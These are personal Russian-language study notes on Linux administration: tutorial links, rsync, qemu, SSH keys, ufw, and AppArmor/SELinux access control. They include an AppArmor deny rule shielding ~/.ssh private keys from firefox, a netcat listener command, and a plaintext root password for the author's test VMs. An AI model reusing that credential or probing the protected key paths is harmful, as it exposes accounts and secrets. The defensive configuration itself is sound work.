!! шрифт для файла Consolas
для терминалов RGB:60-60-60 цвет фона, цвет шрифта 248-234-188 
!Вызов/переключения tty терминалов ctrl+alt+f1-f5
!!! При нехватке места - удалить журналы systemd из /var/log/journal !!
sudo journalctl --vacuum-size=1G
VBOX - частично в ядре как mod частично в user space как ПО,   systemd - в UsrSpace

Забирай icon бесплатные гайды по изучению Python, PHP, Linux, FreePBX
https://wiki.merionet.ru/articles/ustanovlenie-i-prekrashhenie-tcp-soedineniya
https://habr.com/ru/articles/711578/ TCP и UDP, или Два столпа Интернета 
установление tcp и udp node.js
В поисковых машинах goolge yandex поиск по опред-му сайту "запрос site: name_site"
 "nokia site: www.onliner.by"
А.Созыкин Анализ Ethernet Wi-fi HTTPS NDP DNS SNMP ICMP FTP IMAP POP3 IPv6 и дв wireshark 
https://www.youtube.com/playlist?list=PLtPJ9lKvJ4oiKPQ9GXOvntj44Eu8IGAJK 


бесплатные уроки python !
https://ru.hexlet.io/courses/python-basics?utm_source=google&utm_medium=cpc&utm_campaign=freemium&utm_content=perfmax_vpn.segment_keys-python&utm_term=campaignid_20764549337.ad_.adg_.key_.device_c.pst_.rgnid_1001493.type_.match_.clickid_CjwKCAiA1fqrBhA1EiwAMU5m_zR9fKjU-WfAmrgDHVhTdFJ-sW-HG-H7VMDCsp3DmKrbUCPruGY8ZBoCvyAQAvD_BwE&gclid=CjwKCAiA1fqrBhA1EiwAMU5m_zR9fKjU-WfAmrgDHVhTdFJ-sW-HG-H7VMDCsp3DmKrbUCPruGY8ZBoCvyAQAvD_BwE
бесплатные уроки python!
https://ru.hexlet.io/courses/python-basics?utm_source=google&utm_medium=cpc&utm_campaign=freemium&utm_content=perfmax_vpn.segment_keys-python&utm_term=campaignid_20764549337.ad_.adg_.key_.device_c.pst_.rgnid_1001493.type_.match_.clickid_CjwKCAiA1fqrBhA1EiwAMU5m_zR9fKjU-WfAmrgDHVhTdFJ-sW-HG-H7VMDCsp3DmKrbUCPruGY8ZBoCvyAQAvD_BwE&gclid=CjwKCAiA1fqrBhA1EiwAMU5m_zR9fKjU-WfAmrgDHVhTdFJ-sW-HG-H7VMDCsp3DmKrbUCPruGY8ZBoCvyAQAvD_BwE



https://habr.com/ru/companies/vk/articles/115163/ Oauth
https://infra.gnulinux.pro/ru/latest/ !!!! СКАЧАТЬ

Инсталляционный сервер, jump host, jump server https://infra.gnulinux.pro/ru/latest/infra/06/06._Jump_host.html
DNAT проброс портов firewall-cmd --zone=external --add-forward-port=port=17777:proto=tcp:toaddr=10.0.2.101:toport=22 --permanent
   https://infra.gnulinux.pro/ru/latest/infra/06/06._Jump_host.html    

донастроить ssh-agent https://infra.gnulinux.pro/ru/latest/infra/06/06._Jump_host.html



Подробно о HTTP Галеев и др
https://www.youtube.com/watch?v=QRDZtarESWI&t=1432s - также подрробно о HTTP методах get post head!
https://www.youtube.com/watch?v=uxoGYIWCQZg&list=PLXR11-5Ez3irR9J3dlEqtuCplYzy2cwdD&index=16

Передача двоичных файлов по HTTP выполянется с применением преобразования base64
https://www.youtube.com/watch?v=QRDZtarESWI&t=1432s - также подрробно о HTTP методах get post head!
https://www.youtube.com/watch?v=6_mKtUWSoUs&list=PLlb7e2G7aSpT5DX9rQKnmZMK0DG7dWrUc&index=11
cat test.png | base64

прдача файлов по сети  scp rsync sftp

markdown конвертер в html https://md2html.vercel.app/


https://www.youtube.com/watch?v=6uy7x2-LpTE

Протокол FTP 
https://www.youtube.com/watch?v=Uji0sQ-Co7Q&t

Протокол TCP
https://www.youtube.com/watch?v=CKUOb4htnB4
https://www.youtube.com/watch?v=ZHNPG_2kCnQ&t=2s


Разработанный проектом Let's Encrypt протокол Automatic Certificate Management Environment (ACME)
утверждён RFC https://www.opennet.ru/opennews/art.shtml?num=50301
Протокол ACME применяется для организации взаимодействия удостоверяющего центра (CA)и web-сервера, например, для автоматизации получения и обслуживания сертификатов SSL. Запросы передаются в формате JSON поверх HTTPS. Стандартизирована вторая версия протокола ACMEv2, обеспечивающая поддержку масок в сертификатах, предоставляющая усовершенствованный механизм авторизации, поддерживающий операции переименования ресурсов и предлагающий новый метод проверки владения доменом TLS-SNI-02 (не вошёл в RFC).
Доступны реализации ACME на различных языках программирования, а также специализированный модуль для http-сервера Apache 
Как это работает ACME - читай https://habr.com/ru/companies/1cloud/articles/444986/

== Почта и DNS "GNU Linux Pro", Murad Aslanov ==
DNS записи для почтовых серверов MX PTR SPF DKIM DMARC
https://habr.com/ru/articles/496018/

PTR
при получении почты почтовый сервер делает два запроса PTR на получение имени по IP-адресу и 
  на получение IP-адреса по имени отправителя, если результаты совпадают сервер считает отправителя 
 тем за кого он себя выдает.

Про порты и шифрование в почтовых серверах  SMTPS и STARTTLS
https://habr.com/ru/articles/495256/

Режимы работы почтовых серверов Postfix 
https://habr.com/ru/articles/494906/

Как работает электронная почта
https://habr.com/ru/articles/494788/

дПОЛНИТЕЛЬНО:
SPF https://habr.com/ru/articles/63768/, https://habr.com/ru/companies/vk/articles/338700/
DKIM https://messagebird.com/guides/o/dkim-domainkeys-identified-mail?sp=true
DMARC https://habr.com/ru/articles/253705/
== END Почта и DNS Murad Aslanov ==


eval $(ssh-agent -s)



Postman — программа, которая проверяет работу API с помощью запросов
https://www.postman.com/
https://sky.pro/media/postman-kak-polzovatsya/
https://www.drawio.com/ diagrams.net

МИНИ задачи 

 = rsync = урок 56. GNULinux Передача файлов по сети
rsync -av _dir1/ oem@192.168.100.12:~/ #отправить файлы из _dir1 на .12 в /home/oem
sending incremental file list ./ file1 file2 file3

rsync -av _dir1 oem@192.168.100.12:~/ #отправить файлы из _dir1 на .12 в /home/oem/_dir
sending incremental file list _dir1/ _dir1/file1 _dir1/file2 _dir1/file3

rsync -avzP --exclude=.git _dir1 oem@192.168.100.12:~/ #отправить файлы из _dir1 на .12 в /home/oem/_dir 
           !! за исключением файлов и каталогов ".git", в сжатом виде и показать прогресс передачи !!

rsync -av oem@192.168.100.12:~/debian ~/ #забрать с удален hosta .12 папку и все файлы вней и поместить ~/

rsync -av --delete  ~/_dir1 oem@192.168.100.12:~/ # скопировать на хост .12 измененные файлы в  ~/_dir1, 
  а  также удалить на  .12:~/_dir1 файлы, которые были удалены в ~/_dir1 хоста-источника, те выполнить
  синхронизацию папок



    fuse  файловые системы fuse(8)           fuse - configuration and mount options for FUSE file systems
DESCRIPTION
       FUSE  (Filesystem  in Userspace) is a simple interface for userspace programs to export a vir‐
       tual filesystem to the Linux kernel. FUSE also aims to provide a secure method for non  privi‐
       leged users to create and mount their own filesystem implementations.
   avahi-browse --all ???

  https://habr.com/ru/articles/538662/ ldap

  ncap  гнулинx  sync/swop chrt (50й файл) fingerprint  аутентификация по ключу
  загрузка в в bin sh до gui смена пароля root
   sudo nc -ul 5555 и др урок 46
  https://losst.pro/ispolzovanie-docker-dlya-chajnikov
Setting up taps on Linux см https://wiki.qemu.org/Documentation/Networking
 # ip link add br0 type bridge
 # ip tuntap add dev tap0 mode tap
 # ip link set dev tap0 master br0   # set br0 as the target bridge for tap0
 # ip link set dev eth0 master br0   # set br0 as the target bridge for eth0
 # ip link set dev br0 up

==qemu==
  https://losst.pro/samye-malenkie-distributivy-linux
  https://alpinelinux.org/downloads/ 
  https://losst.pro/kvm -  Программная виртуализация;Аппаратная виртуализация; Виртуализация уровня операционной системы.
  https://losst.pro/kak-polzovatsya-qemu 
   https://www.msys2.org/ https://www.msys2.org/wiki/MSYS2-introduction/  https://www.qemu.org/download/#windows
   msys2 запускать от лица admin windows
  https://wiki.sensi.org/dokuwiki/doku.php?id=msys2_mingw
  https://losst.pro/kak-polzovatsya-qemu 
  https://wiki.qemu.org/Category:User_documentation # офиц документация qemu
  ucrt64.exe ->  qemu-img create -f qcow2 ubuntu.qcow 10G
 qemu-img create -f qcow2 ubuntu.qcow 10G # создать вирт диск 
 запуск вирт машин легковесных дистрибутивов linux, полностю загружаются в ram, не инстал на диск, файлы на диске также
 не сохраняются!
 qemu-system-x86_64 -hda lnx1.qcow -boot d -cdrom d:\alpine-virt-3.18.5-x86_64.iso -m 640 # запустить VM
 qemu-system-x86_64 -hda lnx1.qcow -boot d -cdrom d:\TinyCore-current.iso -m 1024 
 qemu-img create -f qcow2 slx_disk.cow 3G # создать вирт диск

 qemu-system-x86_64 -hda d:\lnxfce2.vdi -boot c -m 2024  -nic user,model=e1000 -device e1000,netdev=net0 -netdev   user,id=net0,hostfwd=tcp::5555-:22 #запуск vdi c virtbox c linux mint, с 2 мя eth адаптерами, с сетями 10.0.2.0/255 (вит филиал),
  Файлы сохраняются на vdi
 При настройке вручную 10.250.14.220 выполняется пинг с ya.ru есть, но с 10.250.14.230 нет, arp не видит lan бтк
 e1000 - имя модуля для сетевой карты 
 
qemu-system-x86_64 -hda d:\lnxfce2.vdi -boot c -m 3024  -device e1000,netdev=net0,mac=9c:93:4e:56:6f:аc -netdev  user,id=net0,hostfwd=tcp::5555-:22  - НЕ ЗАПУСТИЛОСЬ!
 https://wiki.qemu.org/Documentation/Networking


+сеть ifconfig eth0 inet ip mask 255.255.255.0

https://ftp.mgts.by/pub/linuxmint/isos/stable/21.2/linuxmint-21.2-cinnamon-64bit.iso

https://translated.turbopages.org/proxy_u/en-ru.ru.6ebf9c17-656f81a4-77bbf01d-74722d776562/https/www.computerhope.com/unix/mysqltut.htm#Entering-Queries

sync - Synchronize cached writes to persistent storage
       If  one  or more files are specified, sync only them, or their containing file sys‐
       tems. -d, --data sync only file data, no unneeded metadata
       -f, --file-system sync the file systems that contain the files

!!! dd if=/dev/zero of=/mnt/file bs=1M count=5 //скопировать-создать файл 5МБ
= end Mini Задачи=


= = DAC MAC (SELinux, AppArmor) = = 
DAC  Избирательное управление доступом (англ. discretionary access control, DAC) —
 дискреционное управление доступом,  управление доступом "по усмотрению"
  управление доступом субъектов (владельцев ресурсов- пользователей или ПРОЦЕССОВ, запущенных пользователями ) к объектам (файлам) 
  на основе списков управления доступом ACL или матрицы доступа (rwxrwxrwx), задаваемой umask. 
  Т.о. владелец ресурса, а также др. пользователи/группы, которым владелец дал доступ на r/w/x, а также 
  ПРОЦЕССЫ, запущенные владельцами и теми пользователями, могут получать доступ к файлам, где есть соотв-й rwx
  НЕДОСТАТОК DAC в том, что например процесс firefox или skype (запущенные oem) могут получать доступ 
  к закрытим /критичным ресурсам,например к приватному ключу для ssh 
ls .ssh/id_rsa
-rw------- 1 oem oem 2590 ноя 26 23:06 .ssh/id_rsa
 Например в FAT разделе нет владельцев, кто примантировал раздел, тот стал на время владельцем его ресурсов.
DAC - модель разграничения прав, МАС - модель ограничения возможностей
В Linux приобращении к ресурсу/файлу(open, write)сначала выполняется проверка DAC,если она успешна - проверка MAC
MAC разграничение доступа субъектов к объектам, основанное на назначении метки конфиденциальности для информации,
содержащейся в объектах, и выдаче официальных разрешений (допуска) субъектам на обращение к информации такого уровня конфиденциальности. 
MAC модель принудительного распределения прав - в отличии от от DAC устанавливаются правила доступа для 
ПРОГРАММ/ПРОЦЕССОВ к файлам не исходя из желаний влательцев, а из семантики /смысла назанчения программы, 
 устанавливается толко админом root

Профиль MAC - набор правил для ПРОЦЕССОВ одной отдельной программы.
MAC - Для каждой пары (субъект — объект) должно быть задано явное и недвусмысленное перечисление допустимых типов
 доступа (читать, писать и т. д.), то есть тех типов доступа, которые являются санкционированными для данного
 субъекта (индивида или группы индивидов) к данному ресурсу (объекту)

 * * MAC SELinux * * 
SELinux Linux. Pingv Установка, настройка, администрирование.pdf стр755

 * * MAC AppArmor * * 
https://losst.pro/nastrojka-apparmor-v-ubuntu-16-04
https://habr.com/ru/companies/ruvds/articles/532988/
AppArmor Linux. Pingv Установка, настройка, администрирование.pdf стр762
При запуске AppArmor файловая система securityfs подключается в каталоге /sys/kernel/security. Файлы из этого каталога содержат информацию об активных
профилях, количестве обнаруженных нарушений правил и т. д
https://help.ubuntu.ru/wiki/%D1%80%D1%83%D0%BA%D0%BE%D0%B2%D0%BE%D0%B4%D1%81%D1%82%D0%B2%D0%BE_%D0%BF%D0%BE_ubuntu_server/%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C/apparmor


!sudo apt install apparmor-utils !
https://www.linuxcapable.com/how-to-enable-or-disable-apparmor-on-ubuntu-linux/ - генерировать профиль для firefox
Модель безопасности AppArmor работает путем определения профилей для каждого приложения, которые определяют
 разрешения и ресурсы, к которым приложению разрешен доступ. Таким образом, даже если приложение
 скомпрометировано, ущерб, который может быть нанесен, ограничен ресурсами, определенными в профиле.

установить пакеты apparmor
sudo apt install apparmor-utils apparmor-notify apparmor-profiles apparmor-profiles-extra
Включить Apparmor при загрузке системы (по умолчанию):
sudo systemctl enable apparmor  !!!

sudo apparmor_status #проверить статус профилей apparmor_
sudo aa-status #более подробное и точное считывание текущего состояния AppArmor в вашей системе.
 эта команда будет отображать состояние всех профилей, загруженных в вашу систему, включая имя
 каждого профиля, режим, в котором он работает (например, принудительно, жалоба или без ограничений),
 и количество процессов, связанных с каждым профилем. полезна при устранении неполадок AppArmor или  
 определении того, какие профили вызывают проблемы в вашей системе  .

sudo cat /sys/kernel/security/apparmor/profiles # перечнь профилей и их типов
/usr/lib/firefox/firefox (enforce)
traceroute (complain)
smbldap-useradd (complain)
smbldap-useradd///etc/init.d/nscd (complain)
smbd (complain)
smbd//null-/usr/lib/x86_64-linux-gnu/samba/samba-bgqd (comp

 сделать резервную копию профилей AppArmor перед внесением каких-либо изменений.
sudo cp -R /etc/apparmor.d /etc/apparmor.d.bak
Если для какой-то программы включен профиль enforce, но самого профиля нет (удален из /etc/apparmor.d),
  то запуск процессов будет блокироваться

aa-genprof генерирует новый профиль AppArmor на основе текущей активности системы. Он регистрирует 
 все системные вызовы приложения и создает новый профиль на основе этих данных журнала. 
 Это полезно для создания профилей для новых приложений, для которых еще не определен профиль.
sudo aa-genprof firefox #сгенерировать новый профиль для приложения "firefox"
                       # Я не получилось создать рабочий профиль, блокировал запуск firefox


https://doc.opensuse.org/documentation/leap/security/html/book-security/cha-apparmor-profiles.html
30.7.9 Deny rules            # !!создание запрета!!!
Deny rules can be used to annotate or quiet known rejects. The profile generating tools do not ask about a known reject treated with a deny rule. Such a reject does not show up in the audit logs when denied, keeping the log files lean. If this is not desired, put the keyword in front of the deny entry. audit
It is also possible to use deny rules in combination with allow rules. This allows you to specify a broad allow rule, and then subtract a few known files that should not be allowed. Deny rules can also be combined with owner rules, to deny files owned by the user. The following example allows read/write access to everything in a users directory except write access to the files: .ssh/
deny /home/*/.ssh/** w,
owner /home/*/** rw,

готовые профили для программ
https://devtype.blogspot.com/2017/03/AppArmor.html +sudo apt install  apparmor-profiles
https://debianforum.ru/index.php?topic=10749.0 профильпростой для firefox
готовые профили usr.bin.firefox 
https://github.com/nibags/apparmor-profiles/blob/master/apparmor.d/usr.bin.firefox?ysclid=lpsttjiolc25760375
https://devtype.blogspot.com/2017/03/Kak-vkljuchit-AppArmor-dlja-Firefox-i-Chromium.html?ysclid=lpu9jty7oc488589930
+https://askubuntu.com/questions/1171610/with-firefox-esr-installed-apparmor-failed-to-start-with-could-not-open-abstra

sudo aa-unconfined #!!!  список незащищенных программ(активных в памяти)  !!!19:24 12/9/2023
1 /usr/lib/systemd/systemd (/sbin/init) не имеет ограничений
631 /usr/sbin/rpcbind (/sbin/rpcbind) не имеет ограничений

https://github.com/nibags/apparmor-profiles/blob/master/apparmor.d/usr.bin.firefox?ysclid=lpsttjiolc25760375
Я - Удалось настройить запрет на доступ firefox в ~/.ssh/ толькона основе данного профиля и при условии
"deny /home/*/.ssh/** rw", в раздел  # noisy
  deny @{MOZ_LIBDIR}/** w,
  deny /boot/initrd.img* r, ....., в других не работала 

перезапустить профиль после изменений:
sudo apparmor_parser -r /etc/apparmor.d/usr.lib.firefox.firefox

Отключить профиль firefox:
sudo ln -s /etc/apparmor.d/usr.lib.firefox.firefox /etc/apparmor.d/disable/
sudo apparmor_parser -R /etc/apparmor.d/usr.lib.firefox  #Отключить профиль firefox

sudo aa-complain  /usr/lib/firefox/firefox #переводит профиль в режим complain/жалоб и  
       оставляет только защиту DAC.
sudo aa-complain /usr/lib/firefox/firefox #переводит профиль в режим ограничений (enforce/принуждения).


удалить apparmor-notify apparmor-prof-extra!!

echo  /{,usr/}sbin/dhclient
/sbin/dhclient /usr/sbin/dhclient

sudo nano /etc/apparmor.d/usr.bin.lib.firefox
sudo apparmor_parser -r /etc/apparmor.d/usr.bin.lib.firefox


8) selinux  https://losst.pro/nastrojka-selinux  tomoyo Самоучитель системного администратора Linux ( PDFDrive ).pdf 
   selinux - система безопасности
    ps -Z (man ps " Z      Add a column of security data.  Identical to -M (for SELinux).")
       chcon - change file security context


= ssh доступ аутентификация по ключу без пароля =
https://en.wikipedia.org/wiki/Secure_Shell  Раздел "Authentication: OpenSSL"
"When the public key is present on the remote end and the matching private 
  key is present on the local end, typing in the password is no longer required."
https://losst.pro/avtorizatsiya-po-klyuchu-ssh
44. Удалённый доступ - SSH — Основы GNU_Linux:
ssh -X root@192.168.100.4 #запуск ssh-сеcсии с пробросом графики X11 между linuxPSs 
ssh-keygen #создать на ssh-клиенте 2 ключа id_rsa и id_rsa.pub приватный и публичный 
            для сеансов ssh.Если При генерации ключей ввести Непустые пароли, то каждый 
            раз при аутентиф-ции придется их вводить при как и при доступе по паролю
           (чтобы каждый раз не вводить пароли от ключей, а ввести один раз - использовать 
           процесс ssh-agent, запустить eval $(ssh-agent), он будет делать это сам.
            см https://infra.gnulinux.pro/ru/latest/infra/06/06._Jump_host.html )
Передача публичного ключа на сервер:
1.Вариант
ssh-copy-id oem@192.168.100.4 #передача публ ключа id_rsa.pub на ssh-сервер 192.168.100.4
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/oem/.ssh/id_rsa.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
Number of key(s) added: 1
   ключ на сервере добавляется в файл /home/oem/.ssh/authorized_keys  !!!
2.Вариант
cat ~/.ssh/name_of_keyfaile.pub | ssh username@remote_host "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
cat ~/.ssh/key_for_lnx2ssh.pub | ssh oem@192.168.100.10 "cat >> ~/.ssh/authorized_keys"

Создание для ключей для Windows10
Первый вариант с OpenSSH
1) ssh-keygen  #создать на ssh-клиенте 2 ключа id_rsa и id_rsa.pub
2) Добавить публ ключ на ssh-сервер https://chrisjhart.com/Windows-10-ssh-copy-id/
type $env:USERPROFILE\.ssh\id_rsa.pub | ssh  oem@192.168.100.12 "cat >> .ssh/authorized_keys"
Второй вариант! ключей для Windows10 https://selectel.ru/blog/ssh-authentication/?ysclid=lqjqxadczl360171733
  в тч. генерирование ключей на с  puttygen.exe,  +Проброс авторизации ssh
puttygen.exe удалось сгененииовать ключи (id_ecdsa, id_ecdsa.pub), но в файлах в windows10 разбились на
  много строк. Пришлось в ~/.ssh/authorized_keys вручную соединить в одну строку, коекак заработало, 
  но с ошибкой 

 *Автоматизировать  подключение к хостам через host имя, добавить*
cat ~/.ssh/config
Host lnx2
  Hostname  192.168.100.12
  User oem
  IdentityFile  ~/.ssh/id_rsa
донастроить ssh-agent https://infra.gnulinux.pro/ru/latest/infra/06/06._Jump_host.html

 * Изменить порт sshd 22 firewall ufw*
https://www.dev-notes.ru/articles/devops/how-to-change-the-default-ssh-port-in-linux/?ysclid=lqkspqb7a8221359904
Шаг1:sudo nano /etc/ssh/sshd_config  # важно!! ПРАВИТЬ файл sshd_config !а не ssh_config 
#Port 22 Раскомментируйте и измените на Port 4321
Шаг2: Настройка правил файрвола firewall ufw
sudo ufw allow 4321/tcp
sudo ufw delete allow 22/tcp
sudo ufw reload
Шаг3: sudo systemctl restart ssh
Шаг4:  ssh -p 4321 oem@192.168.100.10  #если ок, успешно изменили порт SSH по умолчанию.


= firewall ufw = 
sudo ufw enable # запустить fw
sudo ufw allow 445/tcp # разрешить SMB
sudo ufw app list # перечень профилей приложений для FW
  Apache    CUPS    OpenSSH    Postfix....

sudo ufw app info OpenSSH
Профиль: OpenSSH
Заголовок: Secure shell server, an rshd replacement
Описание: OpenSSH is a free implementation of the Secure Shell protocol.
Порт:   22/tcp

sudo ufw allow 4321 # добавитьтправило для ipv4 ipv6
Правило добавлено
Правило добавлено (v6)

 sudo ufw  status verbose
Состояние: активен Журналирование: on (low)
В                          Действие    Из
-                          --------    --
22                         ALLOW IN    Anywhere
4321                       ALLOW IN    Anywhere
22 (v6)                    ALLOW IN    Anywhere (v6)
4321 (v6)                  ALLOW IN    Anywhere (v6)

sudo journalctl -f # запись в журнале после включения firewall ufw на lnx1 (192.168.100.10) и блокирования tcp 
 запросов на установление соединения по протоколу nfs с lnx2 (192.168.100.12)
дек 27 00:32:14 LnxPC1 kernel: [UFW BLOCK] IN=enp0s3 OUT= MAC=08:00:27:30:1c:fd:08:00:27:99:5e:72:08:00
 SRC=192.168.100.12 DST=192.168.100.10 LEN=172 TOS=0x00 PREC=0x00 TTL=64 ID=56829 DF PROTO=TCP SPT=745 
 DPT=2049 WINDOW=501 RES=0x00 ACK PSH URGP=0 
=end ufw =

SED https://linuxhint.com/50_sed_command_examples/
sed 's/\#\s/Listen\ 555/g' hosts

https://keepassxc.org/ менеджер паролей


https://realt.onliner.by/2023/07/08/foto-nemigi-s-musorki
Руководства
!!! https://debian-handbook.info/browse/ru-RU/stable/!!!

https://forum.ubuntu.ru/
https://help.ubuntu.ru/wiki/%D0%B3%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F 
https://pingvinus.ru/
https://wiki.archlinux.org/
https://losst.pro/
https://man7.org/linux/man-pages/man5/proc.5.html
https://www.linuxlib.ru/unixarch/glav2a_67.htm  !!!

Linux. Установка, настройка, администрирование.pdf Самоучитель системного администратора Linux ( PDFDrive ).pdf
https://dzen.ru/a/Xw4bF00eoQw2CMsB
https://habr.com/ru/company/otus/blog/424761/
https://zalinux.ru/?p=4911
https://wiki.archlinux.org/title/Systemd_(%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9) systemctl 
crones://man7.org/linux/man-pages/man7/bootup.7.html
https://www.freedesktop.org/software/systemd/man/bootup.html - читать в переводе

https://www.youtube.com/@DmitryKetov/playlists !! Ketov video
UBUNTU https://ubuntu.com/download/desktop/thank-you?version=22.04.2&architecture=amd64  УСТАНОВКА
https://itsfoss.com/install-linux-mint-in-virtualbox/#:~:text=Step%201%3A%20Download%20VirtualBox%20from,are%20ready%20to%20get%20started.

https://www.dz-techs.com/ru/swap-partition // раздел подкачки swap
https://losst.pro/ustanovka-linux-ryadom-s-windows-10?featurl=1#%D0%9D%D0%B5%D0%BC%D0%BD%D0%BE%D0%B3%D0%BE_%D1%82%D0%B5%D0%BE%D1%80%D0%B8%D0%B8 // установка Linux и Windows на одном ПК

ИЗУЧИТЬ {
https://losst.pro/protsess-zagruzki-linux Процесс загрузки Linux
https://losst.pro/chto-takoe-inode?featurl=1 inode
https://losst.pro/kak-sozdat-polzovatelya-linux adduser создание пользователя
https://losst.pro/kak-sozdat-gruppu-linux groupadd 
https://losst.pro/komanda-usermod-v-linux // изменить имя пользователя
https://pingvinus.ru/note/useradd !!!!
https://losst.pro/kak-polzovatsya-ssh 
https://losst.pro/kak-podklyuchitsya-po-ssh
https://winitpro.ru/index.php/2020/01/22/vstroennyj-ssh-klient-windows/?ysclid=levx840qvn996030903 ssh client windows
https://learn.microsoft.com/ru-ru/windows-server/administration/openssh/openssh_keymanagement
https://losst.pro/avtorizatsiya-po-klyuchu-ssh

https://losst.pro/prikolnye-komandy-linux rev cowsay и др.
https://losst.pro/komandy-terminala-linux
https://habr.com/ru/post/469667/ полномочия файлов umask chmod
https://losst.pro/spisok-grupp-polzovatelya-linux Список групп пользователя Linux 
https://wiki.merionet.ru/servernye-resheniya/43/peremennye-okruzheniya-v-linux-kak-posmotret-ustanovit-i-sbrosit/ перемен окружения
 echo "LANG=ru_RU.UTF-8" > /etc/locale.conf!! запись в конфиг перем окружения !!!!!
https://losst.pro/nastrojka-cron?pplrurl=1
https://losst.pro/prava-dostupa-k-fajlam-v-linux?pplrurl=1
https://losst.pro/kopirovanie-fajlov-v-linux?pplrurl  Копирование файлов cp rsync xcp
https://losst.pro/kak-dobavit-polzovatelya-v-gruppu-linux?ysclid=lpeivvka9m37226109 // добавить ПОЛЬЗОВАТЕЛЯ C ПРИВИЛЕГИЯМИ SUDO В UBUNTU
https://baks.dev/article/ubuntu/how-to-add-user-to-sudoers-in-ubuntu  //    -//-
logi iperf и др
!создание пользователя/измен польз-ля mvn c каталогом и расш настройками
 https://ru.wikipedia.org/wiki/%D0%A1%D0%B8%D1%81%D1%82%D0%B5%D0%BC%D0%BD%D1%8B%D0%B9_%D0%B2%D1%8B%D0%B7%D0%BE%D0%B2 -сист вызовы
Как пользоваться qemu https://losst.pro/kak-polzovatsya-qemu 


https://habr.com/ru/company/otus/blog/525012/ strace
man proc
man hier ! // справочник о дереве каталогов
файлы *.d
starce ltrace // трассировка системных вызовов (open read wr close) программы  trace system calls 
Ltrace библиотечных вызовов  and signals

man man //разделы man)
1. Выполняемые программы или команды для командной оболочки.
2. Системные вызовы (функции, предоставляемые ядром).
3. Библиотечные вызовы (функции программных библиотек).
4. Специальные файлы (которые обычно находятся в /dev).

man -K "tty" // поиск по всем справочным страницам "tty"
--Man-- след: login(1) [ просм (ввод) | пропуск (Ctrl-D) | выход (Ctrl-C) ]
--Man-- след: peekfd(1) [ просм (ввод) | пропуск (Ctrl-D) | выход (Ctrl-C) ]
--Man-- след: pstree(1) [ просм (ввод) | пропуск (Ctrl-D) | выход (Ctrl-C) ]

man 2 name_of_systemcall {select / bind / ioctl / kill / open..}справка по системным вызовам,РАЗДЕЛ 2!


https://losst.pro/nastrojka-collectd-dlya-nachinayushhih  Настройка Collectd для начинающих


mkntfs 99
https://losst.pro/upravlenie-protsessami-v-linux?cmdurl=1 управление процессами

https://blog.sedicomm.com/2019/07/21/obyasnenie-tipov-fajlov-v-linux/?ysclid=lcw78ofhqr745474489 // ТИПЫ ФАЙЛОВ
https://blog.sedicomm.com/2018/07/22/12-prakticheskih-primerov-komandy-grep-v-linux/#2-3   // 12 практических 
примеров команды grep в Linux ZZZZZZZZZZZZZ
https://habr.com/ru/post/469667/ ACL

GRUB на flash   https://habr.com/ru/post/135637/ 
Linux. Установка, настройка, администрирование.pdf Самоучитель системного администратора Linux ( PDFDrive ).pdf
Программирование в Linux. Самоучитель (Иванов Н. Н., 2007)

Multiboot-флешка на GRUB2 с несколькими разделами под Ubuntu https://habr.com/ru/post/135637/

https://andreyex.ru/operacionnaya-sistema-linux/kak-proverit-prostranstvo-podkachki-v-linux/
проверить пространство подкачки !!Использование файла подкачки — лучшая идея, потому что вы легко можете увеличить размер подкачки в Linux. Изменение раздела подкачки не очень хорошая идея.!

Использование SSH клиента в Windows 10 _ Windows для системных администраторов.mhtml

https://curl.se/docs/httpscripting.html  The Art Of Scripting HTTP Requests Using Curl
Искусство написания сценариев HTTP-запросов с помощью curl

https://help.ubuntu.ru/fullcircle/39/%D1%81%D0%BE%D0%B2%D0%B5%D1%82%D1%8B
Покоряй и властвуй: Советы по работе в терминале.

Сокеты домена UNIX vs именованные каналы (НЕ TCPIP!) https://acm.bsu.by/wiki/Unix2017b/%D0%9F%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5_%D1%81%D0%B5%D1%82%D0%B5%D0%B2%D1%8B%D1%85_%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B9#:~:text=%D0%A1%D0%BE%D0%BA%D0%B5%D1%82%20%D0%B4%D0%BE%D0%BC%D0%B5%D0%BD%D0%B0%20UNIX%20(%D0%B0%D0%BD%D0%B3%D0%BB.,%D0%B4%D0%BB%D1%8F%20%D0%B2%D0%B7%D0%B0%D0%B8%D0%BC%D0%BE%D0%B4%D0%B5%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D1%8F%20(%D0%BE%D0%B1%D0%BC%D0%B5%D0%BD%D0%B0%20%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D0%BC%D0%B8) 
https://losst.pro/avtomaticheskoe-montirovanie-fstab-i-systemd // fstab , монтирование в systemd, ext4 journal oderred
https://losst.pro/fajlovaya-sistema-ext4  ext4 s


https://baks.dev/article/ubuntu/how-to-add-user-to-sudoers-in-ubuntu  

Монтирование SMB https://interface31.ru/tech_it/2022/09/montirovanie-faylovyh-sistem-pri-pomoshhi-systemd.html !!!!
ОПРОБОВАТЬ ^!!! + Автомонтирование

https://losst.pro/primery-bash-skriptov   Примеры Bash скриптов !  

https://learn.microsoft.com/ru-ru/training/modules/python-install-vscode/  MICROSOFT
https://learn.microsoft.com/ru-ru/training/

https://netbeez.net/blog/fix-iperf-bug/
for f in /sys/devices/system/cpu/vulnerabilities/*; do echo "${f##*/} -" $(cat "$f"); done 

https://losst.pro/kak-uznat-pid-protsessa-v-linux
https://losst.pro/sbor-informatsii-o-sisteme-ubuntu
ioctl 
https://habr.com/ru/articles/471038/ передача мезду процессми pipe clone 
}ИЗУЧИТЬ 

VM Debian Ubuntu root qaz555
        --------------!!!!!!!! Интро   !!!!!!! ---------------
В UNIX ("UNI"=унифицированная) основная концепция - любая информация (любой логич 
объект системы) это ФАЙЛ (и собственно поименованная область хранения данных на диске, и 
директории, и процессы (в псевдофайловой системе procfs) и внутренние/периферийные/сетевые 
